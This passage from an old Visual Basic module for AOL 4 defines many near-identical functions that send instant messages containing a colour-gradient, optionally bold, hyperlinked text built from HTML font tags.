        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackRedBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlackYellowBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlueBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlueBlackBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlueGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlueGreenBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBluePurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBluePurpleBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlueRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlueRedBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlueYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBlueYellowBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackBlueBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackGreenBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackGreyBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackPurpleBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackedRedBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackRedBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldBlackYellowBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBlueBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBlueBlackBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBlueGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBlueGreenBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBluePurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBluePurpleBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
     AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBlueRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBlueRedBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
      AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBlueYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
       AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function

Function AoL4_ImUlineLinkBoldBlueYellowBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenBlackGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenBlueGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenPurpleGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenRedGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreenYellowGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyBlackGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyBlueGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyGreenGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyPurpleGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyRedGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkGreyYellowGrey(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ >" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenBlackGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenBlue(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenBlueGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenPurple(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenPurpleGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenRed(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenRedGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenYellow(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreenYellowGreen(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<b><Font Color=#" & h & "></b>" & D
    Next b
    AoL4_ImSend (wh0), ("< A href=""" & URL & """ ><b>" + Msg + "</a>")
End Function
Function AoL4_ImUlineLinkBoldGreyBlack(wh0, URL, Txt)
a = Len(Txt)
    For b = 1 To a
        c = Left(Txt, b)
        D = Right(c, 1)
        e = 220 / a
